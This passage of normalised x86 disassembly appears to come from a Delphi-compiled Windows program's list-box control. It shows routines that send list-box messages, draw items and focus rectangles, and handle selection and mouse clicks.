mov eax [ esi + 0x240 ]
call sub_40316c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034e0
sub_437db8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4043f0
xor eax eax
push ebp
push sub_437e2b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_404400
mov esi eax
mov eax esi
call sub_408a50
push eax
mov edx esi
lea eax [ ebp - 0x8 ]
pop ecx
call sub_404030
mov ecx edi
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0x218 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437e32
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f64
retn
sub_437e3c
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0x199
mov eax ebx
call sub_446450
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_437e5c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0x19a
mov eax ebx
call sub_446450
push eax
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_437e98
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0x182
mov eax ebx
call sub_446450
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_437eb8
push ebx
mov ebx eax
mov al [ ebx + 0x238 ]
add al 0xfd
sub al 0x2
jb r-xdata
pop ebx
retn
push 0x0
push 0x0
push 0x184
mov eax ebx
call sub_446450
push eax
call SendMessageA
sub_437eec
push ebx
push esi
push edi
mov esi eax
cmp [ esi + 0x208 ] 0x0
je r-xdata
or edx 0xffffffff
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov eax [ esi + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
xor ecx ecx
mov edx edi
mov eax esi
call sub_43832c
inc edi
dec ebx
jne r-xdata
jmp r-xdata
sub_437f34
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_43804b
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x208 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
inc eax
je r-xdata
mov eax [ ebx + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_438052
lea eax [ ebp - 0x18 ]
mov edx 0x4
call sub_403f64
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
lea ecx [ ebp - 0x18 ]
mov eax [ ebx + 0x218 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x18 ]
call sub_404400
mov edx eax
lea eax [ ebp - 0x14 ]
call sub_404138
mov eax [ ebp - 0x14 ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
mov eax [ ebx + 0x218 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov eax [ ebp - 0x4 ]
pop edx
mov ebx [ eax ]
call [ ebx + 0xd4 ]
inc eax
mov [ ebp - 0x8 ] eax
xor esi esi
inc esi
dec [ ebp - 0x8 ]
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebx + 0x218 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x10 ]
call sub_404400
mov edx eax
lea eax [ ebp - 0xc ]
call sub_404138
mov eax [ ebp - 0xc ]
push eax
mov edx esi
mov eax [ ebx + 0x218 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov eax [ ebp - 0x4 ]
pop edx
mov edi [ eax ]
call [ edi + 0xd4 ]
mov edx esi
mov eax ebx
call sub_4382dc
test al al
je r-xdata
jmp r-xdata
sub_43805c
push ebx
push esi
mov esi eax
cmp [ esi + 0x208 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xcc ]
inc eax
je r-xdata
mov eax [ esi + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
mov eax [ esi + 0x218 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx ebx
mov eax esi
call sub_4382dc
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x218 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
pop esi
pop ebx
retn
sub_4380c8
push ebx
push esi
push ecx
mov ebx eax
cmp [ ebx + 0x22c ] 0x0
jle r-xdata
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x48 ] 0x0
jle r-xdata
mov eax ebx
call sub_43f5b4
mov [ esp ] eax
fild [ esp ]
fild [ ebx + 0x22c ]
fdivp st1
call sub_402948
mov esi eax
cmp esi 0x1
jge r-xdata
push 0x0
push esi
push 0x195
mov eax ebx
call sub_446450
push eax
call SendMessageA
mov esi 0x1
sub_43811c
push ebx
mov ebx eax
cmp edx [ ebx + 0x22c ]
je r-xdata
pop ebx
retn
cmp [ ebx + 0x22c ] 0x0
je r-xdata
mov [ ebx + 0x22c ] edx
mov eax ebx
call sub_44396c
jmp r-xdata
test edx edx
jne r-xdata
mov [ ebx + 0x22c ] edx
mov eax ebx
call sub_446754
test al al
je r-xdata
mov eax ebx
call sub_4380c8
sub_438160
push ebx
mov ebx eax
cmp [ ebx + 0x208 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x188
mov eax ebx
call sub_446450
push eax
call SendMessageA
pop ebx
retn
push 0x0
push 0x0
push 0x19f
mov eax ebx
call sub_446450
push eax
call SendMessageA
pop ebx
retn
sub_4381dc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x208 ] 0x0
je r-xdata
push 0x0
push esi
push 0x186
mov eax ebx
call sub_446450
push eax
call SendMessageA
push 0x0
push esi
push 0x19e
mov eax ebx
call sub_446450
push eax
call SendMessageA
jmp r-xdata
sub_438228
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x239 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x239 ] dl
mov eax ebx
call sub_44396c
mov eax ebx
mov si 0xffd0
call sub_403368
sub_438250
push ebx
push esi
add esp 0xfffffff0
mov ebx eax
mov esi [ ebx + 0x230 ]
mov eax ebx
call sub_446754
test al al
je r-xdata
mov eax esi
add esp 0x10
pop esi
pop ebx
retn
cmp [ ebx + 0x238 ] 0x0
jne r-xdata
mov eax esp
push eax
xor ecx ecx
mov edx 0x198
mov eax ebx
call sub_440d98
mov esi [ esp + 0xc ]
sub esi [ esp + 0x4 ]
sub_4382dc
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
push 0x0
push esi
push 0x187
mov eax ebx
call sub_446450
push eax
call SendMessageA
cmp eax 0xffffffff
jne r-xdata
cmp eax 0x1
sbb eax eax
inc eax
pop ecx
pop edx
pop esi
pop ebx
retn
mov [ esp ] esi
mov [ esp + 0x4 ] 0x0
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bac4
call sub_4038f8
sub_43832c
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx ecx
mov esi edx
mov edi eax
cmp [ edi + 0x208 ] 0x0
je r-xdata
test bl bl
je r-xdata
push esi
xor eax eax
mov al bl
push eax
push 0x185
mov eax edi
call sub_446450
push eax
call SendMessageA
inc eax
jne r-xdata
push 0x0
push 0xffffffff
push 0x186
mov eax edi
call sub_446450
push eax
call SendMessageA
push 0x0
push esi
push 0x186
mov eax edi
call sub_446450
push eax
call SendMessageA
inc eax
jne r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] esi
mov [ esp + 0x4 ] 0x0
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bac4
call sub_4038f8
jmp r-xdata
mov [ esp ] esi
mov [ esp + 0x4 ] 0x0
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bac4
call sub_4038f8
jmp r-xdata
sub_438400
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x238 ]
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
add al 0xfd
sub al 0x2
jae r-xdata
mov [ esi + 0x238 ] bl
mov eax esi
call sub_44396c
mov eax [ esi + 0x218 ]
mov edx [ eax ]
call [ edx + 0x44 ]
xor edx edx
mov eax esi
call sub_4383dc
sub_438458
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_438500
push [ fs : eax ]
mov [ fs : eax ] esp
mov al [ ebx + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ ebx + 0x262 ] 0x0
je r-xdata
mov [ esi + 0xc ] 0xffffffff
jmp r-xdata
cmp [ esi + 0x4 ] 0xffffffff
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_438507
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
cmp eax [ esi + 0x4 ]
jle r-xdata
lea eax [ ebp - 0x4 ]
call sub_403f40
lea eax [ ebp - 0x4 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx ebx
mov eax [ ebx + 0x264 ]
call [ ebx + 0x260 ]
mov eax [ ebp - 0x4 ]
call sub_404400
mov edx eax
mov eax [ esi + 0x8 ]
call sub_408a8c
mov eax [ ebp - 0x4 ]
call sub_404200
mov [ esi + 0xc ] eax
jmp r-xdata
sub_43850c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4385a2
push [ fs : eax ]
mov [ fs : eax ] esp
mov al [ ebx + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ ebx + 0x262 ] 0x0
je r-xdata
mov [ esi + 0xc ] 0xffffffff
jmp r-xdata
cmp [ esi + 0x4 ] 0xffffffff
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4385a9
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
cmp eax [ esi + 0x4 ]
jle r-xdata
lea eax [ ebp - 0x4 ]
call sub_403f40
lea eax [ ebp - 0x4 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx ebx
mov eax [ ebx + 0x264 ]
call [ ebx + 0x260 ]
mov eax [ ebp - 0x4 ]
call sub_404200
mov [ esi + 0xc ] eax
jmp r-xdata
sub_4385c4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_43843c
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
push 0x0
push esi
push 0x197
mov eax ebx
call sub_446450
push eax
call SendMessageA
sub_4385f0
push ebx
push esi
mov esi edx
mov ebx eax
mov al [ ebx + 0x238 ]
mov edx eax
add dl 0xfd
sub dl 0x2
jae r-xdata
mov edx esi
mov eax [ ebx + 0x218 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
pop ebx
retn
sub al 0x3
je r-xdata
xor edx edx
mov eax ebx
call sub_438400
jmp r-xdata
dec al
je r-xdata
mov dl 0x1
mov eax ebx
call sub_438400
jmp r-xdata
sub_438634
push ebx
push esi
push edi
push ebp
add esp 0xffffffd8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov esi eax
push [ esp + 0x4 ]
push [ esp + 0x4 ]
lea edx [ esp + 0x20 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x20 ]
push eax
call PtInRect
test eax eax
je r-xdata
or ebp 0xffffffff
mov eax esi
call sub_43843c
mov ebp eax
mov eax [ esi + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
cmp edi ebp
jle r-xdata
test bl bl
je r-xdata
lea eax [ esp + 0x8 ]
push eax
mov ecx ebp
mov edx 0x198
mov eax esi
call sub_440d98
push [ esp + 0x4 ]
push [ esp + 0x4 ]
lea eax [ esp + 0x10 ]
push eax
call PtInRect
test eax eax
jne r-xdata
mov eax ebp
add esp 0x28
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebp
cmp edi ebp
jg r-xdata
sub_4386c0
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov eax [ esi + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test ebx ebx
je r-xdata
push edi
mov ecx ebx
mov edx 0x198
mov eax esi
call sub_440d98
jmp r-xdata
cmp eax ebx
jle r-xdata
pop edi
pop esi
pop ebx
retn
cmp eax ebx
jne r-xdata
mov eax edi
xor ecx ecx
mov edx 0x10
call sub_402b80
push edi
mov ecx ebx
dec ecx
mov edx 0x198
mov eax esi
call sub_440d98
mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
push eax
push 0x0
push edi
call OffsetRect
jmp r-xdata
sub_438724
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_443258
mov ecx r-xdata
mov edx edi
mov eax ebx
call sub_443184
mov esi rw-data
cmp [ ebx + 0x23b ] 0x0
je r-xdata
mov al [ ebx + 0x238 ]
mov edx eax
add dl 0xfd
sub dl 0x2
setb dl
and edx 0x7f
mov edx [ edx * 4 + rw-data ]
or edx 0x300000
or edx 0x1
or edx [ edi + 0x4 ]
and eax 0x7f
or edx [ eax * 4 + rw-data ]
xor eax eax
mov al [ ebx + 0x23a ]
or edx [ eax * 4 + rw-data ]
xor eax eax
mov al [ ebx + 0x208 ]
or edx [ esi + eax * 4 ]
xor eax eax
mov al [ ebx + 0x239 ]
or edx [ eax * 4 + rw-data ]
cmp [ ebx + 0x22c ] 0x0
setne al
and eax 0x7f
or edx [ eax * 4 + rw-data ]
xor eax eax
mov al [ ebx + 0x224 ]
or edx [ eax * 4 + rw-data ]
cmp [ ebx + 0x23c ] 0x0
setne al
and eax 0x7f
or edx [ eax * 4 + rw-data ]
mov [ edi + 0x4 ] edx
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov esi rw-data
mov eax ebx
mov si 0xffc8
call sub_403368
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
or eax 0x1
not eax
and [ edi + 0x24 ] eax
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x224 ] 0x1
jne r-xdata
and [ edi + 0x4 ] 0xff7fffff
or [ edi + 0x8 ] 0x200
sub_43883c
push ebx
push esi
push edi
mov ebx eax
mov esi [ ebx + 0x48 ]
mov edi [ ebx + 0x4c ]
mov eax ebx
call sub_443384
push 0x14
push edi
push esi
mov eax [ ebx + 0x44 ]
push eax
mov eax [ ebx + 0x40 ]
push eax
push 0x0
mov eax ebx
call sub_446450
push eax
call SetWindowPos
cmp [ ebx + 0x23c ] 0x0
je r-xdata
mov eax ebx
call sub_4380c8
mov eax [ ebx + 0x234 ]
cmp eax 0xffffffff
jne r-xdata
lea eax [ ebx + 0x23c ]
push eax
push 0x1
push 0x192
mov eax ebx
call sub_446450
push eax
call SendMessageA
mov dl [ ebx + 0x238 ]
add dl 0xfd
sub dl 0x2
jae r-xdata
cmp [ ebx + 0x240 ] 0x0
je r-xdata
mov esi [ ebx + 0x240 ]
test esi esi
je r-xdata
mov edx eax
mov eax ebx
call sub_439204
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x244 ]
mov eax ebx
call sub_4385c4
mov edx [ ebx + 0x248 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov [ ebx + 0x234 ] 0xffffffff
mov edx esi
mov eax [ ebx + 0x218 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
lea eax [ ebx + 0x240 ]
call sub_40d3ac
sub_43890c
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
mov eax ebx
call sub_443768
pop esi
pop ebx
retn
mov al [ ebx + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov esi eax
mov [ ebx + 0x240 ] esi
mov edx [ ebx + 0x218 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebx + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebx + 0x234 ] eax
jmp r-xdata
mov eax ebx
call sub_43843c
mov [ ebx + 0x244 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov [ ebx + 0x248 ] eax
sub_438988
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov edx esi
mov eax ebx
call sub_443de0
mov edi [ esi ]
cmp edi 0x201
je r-xdata
mov eax ebx
call sub_440354
test al al
jne r-xdata
cmp edi 0x203
jne r-xdata
cmp [ ebx + 0x5d ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
call sub_443d4c
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov ax [ r-xdata ]
or ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x14 ]
jmp r-xdata
sub_4389ee
add [ eax ] al
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov edi edx
mov esi eax
mov ax [ edi + 0x4 ]
call sub_457424
mov ebx eax
cmp [ esi + 0x5d ] 0x1
jne r-xdata
mov edx edi
mov eax esi
call sub_441268
cmp [ esi + 0x5d ] 0x1
jne r-xdata
cmp [ esi + 0x208 ] 0x0
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x208 ] 0x0
je r-xdata
test bl 0x1
je r-xdata
or ecx 0xffffffff
xor edx edx
mov eax esi
call sub_440258
test bl 0x4
jne r-xdata
mov edx esp
mov eax [ edi + 0x8 ]
call sub_406cd8
mov edx esp
mov cl 0x1
mov eax esi
call sub_438634
mov ebp eax
test ebp ebp
jl r-xdata
test bl 0x4
je r-xdata
test bl 0x1
jne r-xdata
mov edx ebp
mov eax esi
call sub_4382dc
test al al
je r-xdata
or ecx 0xffffffff
xor edx edx
mov eax esi
call sub_440258
jmp r-xdata
sub_438a8c
push esi
mov esi eax
mov ax [ edx + 0x6 ]
dec ax
je r-xdata
mov eax esi
call sub_43f7bc
mov eax esi
mov si 0xffeb
call sub_403368
pop esi
retn
dec ax
je r-xdata
mov eax esi
mov si 0xffe9
call sub_403368
jmp r-xdata
pop esi
retn
sub_438ac0
push ebp
mov ebp esp
add esp 0xffffff70
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
mov [ ebp - 0x18 ] 0xbc2b
lea eax [ ebp - 0x58 ]
mov [ ebp - 0x10 ] eax
mov eax [ edi ]
call sub_446450
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x58 ] 0x2
mov [ ebp - 0x4c ] 0x1
xor eax eax
mov [ ebp - 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x40 ] eax
mov eax [ edi ]
call sub_446450
mov [ ebp - 0x54 ] eax
mov eax [ edi ]
call sub_446450
mov [ ebp - 0x44 ] eax
mov [ ebp - 0x28 ] 0xbc2c
mov eax [ edi ]
call sub_446450
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0x70 ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x70 ] 0x2
mov eax [ edi ]
call sub_446450
mov [ ebp - 0x6c ] eax
xor esi esi
mov eax [ edi ]
call sub_43843c
mov ebx eax
lea eax [ ebp - 0x80 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call GetClipBox
mov eax [ edi ]
mov eax [ eax + 0x4c ]
mov [ ebp - 0x4 ] eax
mov eax [ edi ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x8 ] eax
cmp esi [ ebp - 0x4 ]
jge r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x68 ] ebx
mov eax [ edi ]
mov eax [ eax + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp ebx eax
jge r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x64 ] eax
mov eax [ edi ]
mov eax [ eax + 0x230 ]
mov [ ebp - 0x60 ] eax
mov eax [ ebp - 0x5c ]
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x50 ] ebx
lea edx [ ebp - 0x28 ]
mov eax [ edi ]
mov ecx [ eax ]
call [ ecx - 0x14 ]
mov eax [ ebp - 0x60 ]
add eax esi
push eax
lea eax [ ebp - 0x90 ]
push eax
mov ecx [ ebp - 0x64 ]
mov edx esi
xor eax eax
call sub_416a60
push esi
push edi
lea esi [ ebp - 0x90 ]
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
lea edx [ ebp - 0x18 ]
mov eax [ edi ]
mov ecx [ eax ]
call [ ecx - 0x14 ]
add esi [ ebp - 0x60 ]
inc ebx
mov eax [ edi ]
mov eax [ eax + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp ebx eax
jge r-xdata
mov eax [ edi ]
mov eax [ eax + 0x218 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ ebp - 0x5c ] eax
cmp esi [ ebp - 0x4 ]
jl r-xdata
sub_438c20
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_44455c
push ebp
call sub_438ac0
pop ecx
jmp r-xdata
pop ecx
pop ecx
pop ebp
retn
sub_438c64
push ebx
add esp 0xffffffe0
mov ebx eax
mov [ esp + 0x8 ] 0x201
push esp
call GetCursorPos
lea ecx [ esp + 0x18 ]
mov edx esp
mov eax ebx
call sub_43f6f4
lea eax [ esp + 0x18 ]
call sub_406cec
mov [ esp + 0x10 ] eax
xor eax eax
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x14 ] eax
lea edx [ esp + 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov [ esp + 0x8 ] 0x202
lea edx [ esp + 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
add esp 0x20
pop ebx
retn
sub_438cc4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov esi ecx
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_438dd0
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x252 ] 0x0
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebx + 0x228 ]
call sub_4225d0
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
cmp edi eax
jge r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov ax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x254 ]
call [ ebx + 0x250 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_438dd7
lea eax [ ebp - 0x8 ]
call sub_403f40
retn
mov edx 0x824
mov eax ebx
call sub_441ec4
mov [ ebp - 0x4 ] eax
mov eax ebx
mov si 0xffc8
call sub_403368
test al al
jne r-xdata
sub [ ebp - 0x10 ] 0x2
add [ ebp - 0x18 ] 0x2
jmp r-xdata
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax [ ebx + 0x218 ]
mov esi [ eax ]
call [ esi + 0xc ]
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax ebx
call sub_4392e8
jmp r-xdata
lea eax [ ebp - 0x8 ]
call sub_403f40
mov al [ ebx + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
call sub_404200
push eax
mov eax [ ebp - 0x8 ]
call sub_404400
push eax
mov eax [ ebx + 0x228 ]
call sub_4229f0
push eax
call DrawTextA
sub_438e00
push ebx
push esi
push edi
push ebp
mov esi eax
mov edi [ edx + 0x8 ]
mov bp [ edi + 0x10 ]
mov edx [ edi + 0x18 ]
mov eax [ esi + 0x228 ]
call sub_422a70
mov edx [ esi + 0x68 ]
mov eax [ esi + 0x228 ]
call sub_4228ec
mov edx [ esi + 0x170 ]
mov eax [ esi + 0x228 ]
call sub_422908
cmp [ edi + 0x8 ] 0x0
jl r-xdata
cmp [ edi + 0x8 ] 0x0
jl r-xdata
test bp 0x1
je r-xdata
lea edx [ edi + 0x1c ]
mov eax [ esi + 0x228 ]
call sub_4225d0
push ebp
lea ecx [ edi + 0x1c ]
mov edx [ edi + 0x8 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0xf8 ]
jmp r-xdata
mov eax [ esi + 0x228 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_4221f8
mov eax [ esi + 0x228 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_421a0c
xor edx edx
mov eax [ esi + 0x228 ]
call sub_422a70
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ edi + 0x1c ]
push eax
mov eax [ edi + 0x18 ]
push eax
call DrawFocusRect
test bp 0x10
je r-xdata
sub_438ebc
push ebx
push esi
push edi
mov esi eax
mov edi [ edx + 0x8 ]
mov eax [ esi + 0x230 ]
mov [ edi + 0x10 ] eax
cmp [ esi + 0x238 ] 0x2
jne r-xdata
pop edi
pop esi
pop ebx
retn
lea ecx [ edi + 0x10 ]
mov edx [ edi + 0x8 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0xfc ]
sub_438eec
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_445a68
pop esi
pop ebx
retn
cmp [ ebx + 0x224 ] 0x1
jne r-xdata
mov eax ebx
call sub_44396c
sub_438f18
push ebx
push esi
push edi
mov esi eax
cmp [ esi + 0x208 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor edi edi
mov cl 0x1
mov edx edi
mov eax esi
call sub_43832c
inc edi
dec ebx
jne r-xdata
sub_438f50
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov al [ eax + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x21c ]
call sub_404400
push eax
push 0xffffffff
push 0x18f
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_446450
push eax
call SendMessageA
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x21c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_439330
mov ebx eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov al [ eax ]
sub al 0x8
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x208 ] 0x0
je r-xdata
cmp ebx 0xffffffff
je r-xdata
pop esi
pop ebx
pop ebp
retn
sub al 0x5
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov si 0xffeb
call sub_403368
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax ]
call [ edx + 0xdc ]
mov esi ebx
mov edx esi
mov eax esi
call sub_406d0c
push eax
push 0x1
push 0x19b
